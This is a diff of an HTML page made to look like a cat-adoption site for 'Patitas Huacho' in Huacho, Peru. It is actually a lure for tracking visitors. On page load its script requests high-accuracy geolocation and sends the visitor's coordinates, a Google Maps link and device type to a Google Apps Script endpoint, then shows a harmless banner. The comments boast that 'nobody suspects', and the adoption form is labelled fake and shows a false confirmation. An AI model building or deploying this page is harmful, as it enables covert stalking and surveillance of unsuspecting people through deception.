@@ -3,294 +3,521 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Gatitos en Adopción — Huacho 🐾</title>
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+  <title>Patitas Huacho 🐾</title>
+  <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Nunito:wght@300;400;600;700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --cream: #FDF6EC;
-      --warm: #F5E6D0;
-      --orange: #E8813A;
-      --dark: #2C1810;
-      --mid: #7A4F3A;
-      --soft: #C4956A;
+      --bg: #FFF8F0;
+      --card: #FFFFFF;
+      --orange: #FF6B35;
+      --orange-light: #FFE0D0;
+      --orange-dark: #CC4A1A;
+      --brown: #5C3317;
+      --brown-mid: #8B5E3C;
+      --brown-light: #C4956A;
+      --cream: #FDF0E0;
+      --paw: #FF8C5A;
+      --text: #3D1F0A;
+      --muted: #9B7355;
+      --success: #4CAF50;
     }
     * { margin: 0; padding: 0; box-sizing: border-box; }
+
     body {
-      background: var(--cream);
-      font-family: 'Lato', sans-serif;
-      color: var(--dark);
+      background: var(--bg);
+      font-family: 'Nunito', sans-serif;
+      color: var(--text);
       min-height: 100vh;
+    }
+
+    /* PATAS DE FONDO */
+    body::before {
+      content: "🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾🐾";
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      font-size: 40px;
+      opacity: 0.04;
+      word-break: break-all;
+      line-height: 1.8;
+      pointer-events: none;
+      z-index: 0;
     }
 
     /* HERO */
     .hero {
-      background: var(--dark);
-      padding: 2.5rem 1.5rem 2rem;
+      background: linear-gradient(135deg, var(--brown) 0%, var(--orange-dark) 100%);
+      padding: 2rem 1.25rem 3rem;
       text-align: center;
       position: relative;
       overflow: hidden;
+      z-index: 1;
     }
-    .hero::before {
-      content: "🐾";
+    .hero::after {
+      content: "";
       position: absolute;
-      font-size: 120px;
-      opacity: 0.05;
-      top: -10px; right: -20px;
+      bottom: -1px; left: 0; right: 0;
+      height: 30px;
+      background: var(--bg);
+      border-radius: 50% 50% 0 0 / 100% 100% 0 0;
+    }
+    .hero-logo {
+      font-size: 52px;
+      margin-bottom: 0.25rem;
+      animation: bounce 2s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+    .hero h1 {
+      font-family: 'Fredoka One', cursive;
+      font-size: clamp(26px, 7vw, 38px);
+      color: white;
+      line-height: 1.1;
+      margin-bottom: 0.4rem;
+    }
+    .hero h1 span { color: #FFD580; }
+    .hero p {
+      color: rgba(255,255,255,0.75);
+      font-size: 13px;
+      font-weight: 300;
     }
     .hero-badge {
-      display: inline-block;
-      background: var(--orange);
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: rgba(255,255,255,0.15);
+      border: 1px solid rgba(255,255,255,0.3);
       color: white;
       font-size: 11px;
       font-weight: 700;
-      letter-spacing: 2px;
+      letter-spacing: 1.5px;
       text-transform: uppercase;
       padding: 4px 14px;
       border-radius: 20px;
-      margin-bottom: 1rem;
-    }
-    .hero h1 {
-      font-family: 'Playfair Display', serif;
-      font-size: clamp(28px, 6vw, 42px);
-      color: white;
-      line-height: 1.2;
-      margin-bottom: 0.5rem;
-    }
-    .hero h1 span { color: var(--orange); }
-    .hero p {
-      color: #aaa;
-      font-size: 14px;
-      font-weight: 300;
-      letter-spacing: 0.5px;
+      margin-bottom: 0.75rem;
     }
 
-    /* LOCATION BANNER — se ve normal, nadie sospecha */
+    /* BANNER UBICACION */
     .loc-banner {
-      background: #fff8f0;
-      border-left: 3px solid var(--orange);
-      padding: 0.75rem 1.25rem;
-      margin: 1.25rem 1rem;
-      border-radius: 0 8px 8px 0;
+      background: var(--orange-light);
+      border-left: 4px solid var(--orange);
+      padding: 0.7rem 1rem;
+      margin: 1rem;
+      border-radius: 0 10px 10px 0;
       font-size: 13px;
-      color: var(--mid);
+      color: var(--brown-mid);
       display: flex;
       align-items: center;
       gap: 8px;
+      position: relative;
+      z-index: 1;
     }
-    .loc-banner span { font-size: 18px; }
 
-    /* GRID DE GATOS */
+    /* STATS */
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      padding: 0 1rem 1.25rem;
+      position: relative;
+      z-index: 1;
+    }
+    .stat {
+      background: var(--card);
+      border-radius: 14px;
+      padding: 0.75rem 0.5rem;
+      text-align: center;
+      box-shadow: 0 2px 8px rgba(92,51,23,0.08);
+    }
+    .stat-num {
+      font-family: 'Fredoka One', cursive;
+      font-size: 22px;
+      color: var(--orange);
+    }
+    .stat-label {
+      font-size: 10px;
+      color: var(--muted);
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    /* SECTION */
+    .section-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 1rem 0.75rem;
+      position: relative;
+      z-index: 1;
+    }
     .section-title {
-      font-family: 'Playfair Display', serif;
+      font-family: 'Fredoka One', cursive;
       font-size: 20px;
-      color: var(--dark);
-      padding: 0 1rem;
-      margin-bottom: 1rem;
+      color: var(--brown);
     }
-    .section-title em {
-      font-style: normal;
-      color: var(--soft);
-      font-size: 14px;
-      font-family: 'Lato', sans-serif;
-      font-weight: 300;
-      margin-left: 8px;
+    .section-count {
+      background: var(--orange-light);
+      color: var(--orange-dark);
+      font-size: 12px;
+      font-weight: 700;
+      padding: 3px 10px;
+      border-radius: 20px;
     }
 
+    /* GRID GATOS */
     .grid {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
       gap: 12px;
-      padding: 0 1rem 2rem;
+      padding: 0 1rem 1.5rem;
+      position: relative;
+      z-index: 1;
     }
-
     .cat-card {
-      background: white;
-      border-radius: 14px;
+      background: var(--card);
+      border-radius: 18px;
       overflow: hidden;
-      box-shadow: 0 2px 12px rgba(44,24,16,0.07);
-      transition: transform 0.2s, box-shadow 0.2s;
+      box-shadow: 0 3px 14px rgba(92,51,23,0.1);
+      transition: transform 0.2s;
       cursor: pointer;
+      position: relative;
     }
-    .cat-card:active {
-      transform: scale(0.97);
+    .cat-card:active { transform: scale(0.97); }
+    .cat-img-wrap {
+      width: 100%;
+      aspect-ratio: 1;
+      background: var(--cream);
+      overflow: hidden;
+      position: relative;
     }
-    .cat-emoji {
-      font-size: 56px;
-      text-align: center;
-      padding: 1.25rem 0 0.5rem;
-      display: block;
-      line-height: 1;
+    .cat-img-wrap img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transition: transform 0.3s;
     }
-    .cat-info { padding: 0.5rem 0.85rem 0.85rem; }
-    .cat-name {
-      font-family: 'Playfair Display', serif;
-      font-size: 15px;
+    .cat-card:hover .cat-img-wrap img { transform: scale(1.05); }
+    .cat-img-wrap .loading-cat {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 40px;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+
+    .cat-badge {
+      position: absolute;
+      top: 8px; right: 8px;
+      background: var(--orange);
+      color: white;
+      font-size: 10px;
       font-weight: 700;
-      color: var(--dark);
+      padding: 3px 8px;
+      border-radius: 20px;
     }
-    .cat-age {
+    .cat-info { padding: 0.6rem 0.75rem 0.75rem; }
+    .cat-name {
+      font-family: 'Fredoka One', cursive;
+      font-size: 16px;
+      color: var(--brown);
+    }
+    .cat-meta {
       font-size: 11px;
-      color: var(--soft);
-      font-weight: 300;
+      color: var(--muted);
       margin: 2px 0 6px;
     }
     .cat-tags { display: flex; flex-wrap: wrap; gap: 4px; }
     .tag {
       font-size: 10px;
       font-weight: 700;
-      letter-spacing: 0.5px;
-      padding: 2px 8px;
+      padding: 2px 7px;
       border-radius: 20px;
       text-transform: uppercase;
+      letter-spacing: 0.3px;
     }
-    .tag.jugueton { background: #FEF3C7; color: #92400E; }
-    .tag.tranquilo { background: #E0F2FE; color: #0369A1; }
-    .tag.vacunado { background: #D1FAE5; color: #065F46; }
-    .tag.castrado { background: #F3E8FF; color: #6B21A8; }
-    .tag.sociable { background: #FFE4E6; color: #9F1239; }
-    .tag.tímido { background: #F1F5F9; color: #475569; }
+    .tag.j { background: #FFF3CD; color: #7D4E00; }
+    .tag.t { background: #D4EDFF; color: #004E7D; }
+    .tag.v { background: #D4EDDA; color: #155724; }
+    .tag.c { background: #E8D4FF; color: #4A0E8F; }
+    .tag.s { background: #FFD4E8; color: #7D0033; }
+    .tag.ti { background: #E8E8E8; color: #444; }
 
-    /* ADOPTAR BUTTON */
-    .adopt-btn {
-      display: block;
+    /* FORMULARIO */
+    .form-section {
       margin: 0 1rem 1.5rem;
+      background: var(--card);
+      border-radius: 20px;
+      padding: 1.25rem;
+      box-shadow: 0 3px 14px rgba(92,51,23,0.1);
+      position: relative;
+      z-index: 1;
+    }
+    .form-title {
+      font-family: 'Fredoka One', cursive;
+      font-size: 18px;
+      color: var(--brown);
+      margin-bottom: 0.25rem;
+    }
+    .form-sub {
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 1rem;
+    }
+    .form-group { margin-bottom: 0.75rem; }
+    .form-group label {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--brown-mid);
+      display: block;
+      margin-bottom: 4px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .form-group input,
+    .form-group select,
+    .form-group textarea {
+      width: 100%;
+      padding: 0.6rem 0.85rem;
+      border: 1.5px solid #EDD5BC;
+      border-radius: 10px;
+      font-family: 'Nunito', sans-serif;
+      font-size: 14px;
+      color: var(--text);
+      background: var(--bg);
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .form-group input:focus,
+    .form-group select:focus,
+    .form-group textarea:focus {
+      border-color: var(--orange);
+    }
+    .form-group textarea { resize: none; height: 70px; }
+
+    .submit-btn {
+      width: 100%;
       background: var(--orange);
       color: white;
       border: none;
       border-radius: 12px;
-      padding: 0.9rem;
-      font-family: 'Lato', sans-serif;
-      font-size: 15px;
-      font-weight: 700;
+      padding: 0.85rem;
+      font-family: 'Fredoka One', cursive;
+      font-size: 17px;
       letter-spacing: 0.5px;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      margin-top: 0.25rem;
+    }
+    .submit-btn:active { transform: scale(0.98); background: var(--orange-dark); }
+
+    /* SUCCESS MESSAGE */
+    .success-msg {
+      display: none;
+      background: #D4EDDA;
+      border: 1.5px solid #4CAF50;
+      border-radius: 12px;
+      padding: 1rem;
+      text-align: center;
+      margin-top: 0.75rem;
+    }
+    .success-msg .check { font-size: 32px; margin-bottom: 0.25rem; }
+    .success-msg p { font-size: 13px; color: #155724; font-weight: 600; }
+
+    /* BOTON ADOPTAR */
+    .adopt-btn {
+      display: block;
+      margin: 0 1rem 1.5rem;
+      background: var(--brown);
+      color: white;
+      border: none;
+      border-radius: 14px;
+      padding: 1rem;
+      font-family: 'Fredoka One', cursive;
+      font-size: 17px;
       text-align: center;
       cursor: pointer;
       width: calc(100% - 2rem);
-      transition: background 0.2s, transform 0.1s;
+      transition: background 0.2s;
+      position: relative;
+      z-index: 1;
     }
-    .adopt-btn:active { transform: scale(0.98); background: #d0732e; }
+    .adopt-btn:active { background: #3D1F0A; }
 
     /* FOOTER */
     footer {
-      background: var(--dark);
-      color: #666;
+      background: var(--brown);
+      color: rgba(255,255,255,0.6);
       text-align: center;
       padding: 1.5rem 1rem;
       font-size: 12px;
-      font-weight: 300;
-      line-height: 1.8;
+      line-height: 1.9;
+      position: relative;
+      z-index: 1;
     }
-    footer strong { color: var(--soft); font-weight: 400; }
-
-    /* STATUS invisible para el usuario */
-    #status-invisible { display: none; }
+    footer strong { color: #FFD580; font-weight: 700; }
   </style>
 </head>
 <body>
 
   <div class="hero">
-    <div class="hero-badge">🐾 Huacho, Lima</div>
+    <div class="hero-logo">🐱</div>
+    <div class="hero-badge">📍 Huacho, Lima</div>
     <h1>Gatitos buscan<br><span>un hogar con amor</span></h1>
     <p>Rescatados en las calles de Huacho · Libres y sanos</p>
   </div>
 
-  <div class="loc-banner" id="loc-banner">
+  <div class="loc-banner">
     <span>📍</span>
     <span id="loc-texto">Buscando gatitos cerca a ti...</span>
   </div>
 
-  <p class="section-title">Disponibles ahora <em>6 gaticos</em></p>
-
-  <div class="grid">
-    <div class="cat-card">
-      <span class="cat-emoji">🐱</span>
-      <div class="cat-info">
-        <div class="cat-name">Manchas</div>
-        <div class="cat-age">4 meses · Macho</div>
-        <div class="cat-tags">
-          <span class="tag jugueton">Juguetón</span>
-          <span class="tag vacunado">Vacunado</span>
-        </div>
-      </div>
+  <div class="stats">
+    <div class="stat">
+      <div class="stat-num">6</div>
+      <div class="stat-label">Gatitos</div>
     </div>
-    <div class="cat-card">
-      <span class="cat-emoji">🐈</span>
-      <div class="cat-info">
-        <div class="cat-name">Luna</div>
-        <div class="cat-age">1 año · Hembra</div>
-        <div class="cat-tags">
-          <span class="tag tranquilo">Tranquila</span>
-          <span class="tag castrado">Castrada</span>
-        </div>
-      </div>
+    <div class="stat">
+      <div class="stat-num">100%</div>
+      <div class="stat-label">Vacunados</div>
     </div>
-    <div class="cat-card">
-      <span class="cat-emoji">🐈‍⬛</span>
-      <div class="cat-info">
-        <div class="cat-name">Carbón</div>
-        <div class="cat-age">6 meses · Macho</div>
-        <div class="cat-tags">
-          <span class="tag sociable">Sociable</span>
-          <span class="tag vacunado">Vacunado</span>
-        </div>
-      </div>
-    </div>
-    <div class="cat-card">
-      <span class="cat-emoji">😸</span>
-      <div class="cat-info">
-        <div class="cat-name">Canela</div>
-        <div class="cat-age">2 años · Hembra</div>
-        <div class="cat-tags">
-          <span class="tag tímido">Tímida</span>
-          <span class="tag castrado">Castrada</span>
-        </div>
-      </div>
-    </div>
-    <div class="cat-card">
-      <span class="cat-emoji">🐱</span>
-      <div class="cat-info">
-        <div class="cat-name">Paquito</div>
-        <div class="cat-age">3 meses · Macho</div>
-        <div class="cat-tags">
-          <span class="tag jugueton">Juguetón</span>
-          <span class="tag sociable">Sociable</span>
-        </div>
-      </div>
-    </div>
-    <div class="cat-card">
-      <span class="cat-emoji">🐈</span>
-      <div class="cat-info">
-        <div class="cat-name">Nieve</div>
-        <div class="cat-age">8 meses · Hembra</div>
-        <div class="cat-tags">
-          <span class="tag tranquilo">Tranquila</span>
-          <span class="tag vacunado">Vacunado</span>
-        </div>
-      </div>
+    <div class="stat">
+      <div class="stat-num">0 soles</div>
+      <div class="stat-label">Adopción</div>
     </div>
   </div>
 
-  <button class="adopt-btn" onclick="alert('📞 Llama al: 999-888-777\nPreguntar por Rosario 🐾')">
-    🐾 Quiero adoptar un gatito
+  <div class="section-header">
+    <div class="section-title">🐾 Disponibles</div>
+    <div class="section-count">6 gaticos</div>
+  </div>
+
+  <div class="grid" id="cat-grid">
+    <!-- Cards generadas por JS -->
+  </div>
+
+  <!-- FORMULARIO FALSO DE ADOPCIÓN -->
+  <div class="form-section">
+    <div class="form-title">🏠 Quiero adoptar</div>
+    <div class="form-sub">Llena el formulario y te contactamos en 24 horas</div>
+
+    <div class="form-group">
+      <label>Tu nombre</label>
+      <input type="text" placeholder="Ej: María García" id="f-nombre">
+    </div>
+    <div class="form-group">
+      <label>WhatsApp</label>
+      <input type="tel" placeholder="Ej: 999 888 777" id="f-tel">
+    </div>
+    <div class="form-group">
+      <label>¿Qué gatito te interesa?</label>
+      <select id="f-gato">
+        <option value="">Selecciona uno...</option>
+        <option>Manchas</option>
+        <option>Luna</option>
+        <option>Carbón</option>
+        <option>Canela</option>
+        <option>Paquito</option>
+        <option>Nieve</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>¿Por qué quieres adoptarlo?</label>
+      <textarea placeholder="Cuéntanos un poco sobre ti y tu hogar..." id="f-msg"></textarea>
+    </div>
+
+    <button class="submit-btn" onclick="enviarFormulario()">
+      🐾 Enviar solicitud
+    </button>
+
+    <div class="success-msg" id="success-msg">
+      <div class="check">✅</div>
+      <p>¡Solicitud recibida!<br>Te contactaremos pronto por WhatsApp 🐱</p>
+    </div>
+  </div>
+
+  <button class="adopt-btn" onclick="document.querySelector('.form-section').scrollIntoView({behavior:'smooth'})">
+    🐾 Ver todos los gatitos disponibles
   </button>
 
   <footer>
     <strong>Patitas Huacho</strong> · Rescatistas independientes<br>
     Todos nuestros gatitos tienen vacunas y desparasitación<br>
-    Huacho, Lima · 2024
+    Huacho, Lima · 2024 · <strong>Adopción gratuita</strong>
   </footer>
-
-  <div id="status-invisible"></div>
 
   <script>
     // ============================================================
-    // CONFIGURACIÓN — pega aquí la URL de tu Google Apps Script
+    // CONFIGURACIÓN
     // ============================================================
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx9nJKW0DWRZHBEV22RJfqeQeL58Q83-AQOciU6V5OQJNmK-h_t8PVtWVYmniEvi2JGFw/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxpr9gQE6x_r3TcKzSjPntdZ53YJcW44qJYDcZLAgQeetaIhtqGu74GxEMWJU2ZhkNCHg/exec";
     // ============================================================
 
-    const banner = document.getElementById("loc-texto");
+    const gatos = [
+      { nombre: "Manchas", edad: "4 meses", sexo: "Macho", tags: [{l:"Juguetón",c:"j"},{l:"Vacunado",c:"v"}] },
+      { nombre: "Luna",    edad: "1 año",   sexo: "Hembra", tags: [{l:"Tranquila",c:"t"},{l:"Castrada",c:"c"}] },
+      { nombre: "Carbón",  edad: "6 meses", sexo: "Macho", tags: [{l:"Sociable",c:"s"},{l:"Vacunado",c:"v"}] },
+      { nombre: "Canela",  edad: "2 años",  sexo: "Hembra", tags: [{l:"Tímida",c:"ti"},{l:"Castrada",c:"c"}] },
+      { nombre: "Paquito", edad: "3 meses", sexo: "Macho", tags: [{l:"Juguetón",c:"j"},{l:"Sociable",c:"s"}] },
+      { nombre: "Nieve",   edad: "8 meses", sexo: "Hembra", tags: [{l:"Tranquila",c:"t"},{l:"Vacunado",c:"v"}] },
+    ];
 
+    // Cargar fotos reales de gatos desde TheCatAPI (gratis, sin key)
+    async function cargarFotos() {
+      try {
+        const res = await fetch(`https://api.thecatapi.com/v1/images/search?limit=6`);
+        const data = await res.json();
+        return data.map(d => d.url);
+      } catch {
+        return [];
+      }
+    }
+
+    async function renderGatos() {
+      const grid = document.getElementById("cat-grid");
+      const fotos = await cargarFotos();
+
+      gatos.forEach((g, i) => {
+        const card = document.createElement("div");
+        card.className = "cat-card";
+
+        const tagsHtml = g.tags.map(t => `<span class="tag ${t.c}">${t.l}</span>`).join("");
+        const imgHtml = fotos[i]
+          ? `<img src="${fotos[i]}" alt="${g.nombre}" onload="this.previousElementSibling.style.display='none'">`
+          : "";
+
+        card.innerHTML = `
+          <div class="cat-img-wrap">
+            <div class="loading-cat">🐱</div>
+            ${imgHtml}
+            <div class="cat-badge">Libre</div>
+          </div>
+          <div class="cat-info">
+            <div class="cat-name">${g.nombre}</div>
+            <div class="cat-meta">${g.edad} · ${g.sexo}</div>
+            <div class="cat-tags">${tagsHtml}</div>
+          </div>
+        `;
+        grid.appendChild(card);
+      });
+    }
+
+    function enviarFormulario() {
+      const nombre = document.getElementById("f-nombre").value.trim();
+      const tel = document.getElementById("f-tel").value.trim();
+      if (!nombre || !tel) {
+        alert("Por favor llena tu nombre y WhatsApp 🐾");
+        return;
+      }
+      document.getElementById("success-msg").style.display = "block";
+      document.querySelector(".submit-btn").style.display = "none";
+    }
+
+    // UBICACIÓN
     function actualizarBanner(texto) {
       document.getElementById("loc-texto").textContent = texto;
     }
@@ -298,7 +525,6 @@
     async function enviarASheets(lat, lon, accuracy) {
       const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
       const fecha = new Date().toLocaleString('es-PE');
-
       try {
         await fetch(SCRIPT_URL, {
           method: "POST",
@@ -313,29 +539,24 @@
             dispositivo: navigator.userAgent.includes("Mobile") ? "Celular" : "PC"
           })
         });
-        // Actualiza el banner con algo inocente
         actualizarBanner("Gatitos disponibles en Huacho centro ✓");
-      } catch (e) {
+      } catch {
         actualizarBanner("Gatitos disponibles en tu zona ✓");
       }
     }
 
-    // Se ejecuta automáticamente al cargar
     window.addEventListener("load", () => {
+      renderGatos();
       if (!navigator.geolocation) {
         actualizarBanner("Gatitos disponibles en Huacho ✓");
         return;
       }
-
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
           enviarASheets(latitude, longitude, accuracy);
         },
-        () => {
-          // Si niega el permiso, la página igual se ve normal
-          actualizarBanner("Gatitos disponibles en Huacho ✓");
-        },
+        () => { actualizarBanner("Gatitos disponibles en Huacho ✓"); },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     });
